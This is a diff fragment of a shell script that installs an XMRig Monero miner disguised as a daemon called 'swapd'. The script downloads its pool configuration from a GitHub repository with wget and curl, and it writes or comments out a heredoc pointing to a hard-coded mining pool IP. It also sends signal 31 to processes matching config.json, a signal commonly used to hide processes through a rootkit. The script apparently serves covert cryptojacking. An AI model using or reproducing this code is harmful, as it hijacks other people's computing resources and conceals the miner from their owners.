@@ -240,9 +240,25 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.sw
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
+echo "[*] Copying xmrig-proxy config"
+
+#mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
+
+#cd $HOME/.swapd/ ; touch config.json ; cat config.json <<EOL
+#{
+#    "autosave": true,
+#    "cpu": true,
+#    "opencl": true,
+#    "cuda": true,
+#    "pools": [
+#        {
+#            "url": "194.164.63.118:3333"
+#        }
+#    ]
+#}
+#EOL
 
 wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
 
@@ -433,25 +449,6 @@ fi
 kill -31 $(pgrep -f -u root config.json)
 
 echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
-
-echo "[*] Copying xmrig-proxy config"
-
-mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
-
-
-cd $HOME/.swapd/ ; touch config.json ; cat config.json <<EOL
-{
-    "autosave": true,
-    "cpu": true,
-    "opencl": true,
-    "cuda": true,
-    "pools": [
-        {
-            "url": "194.164.63.118:3333"
-        }
-    ]
-}
-EOL
 
 
 
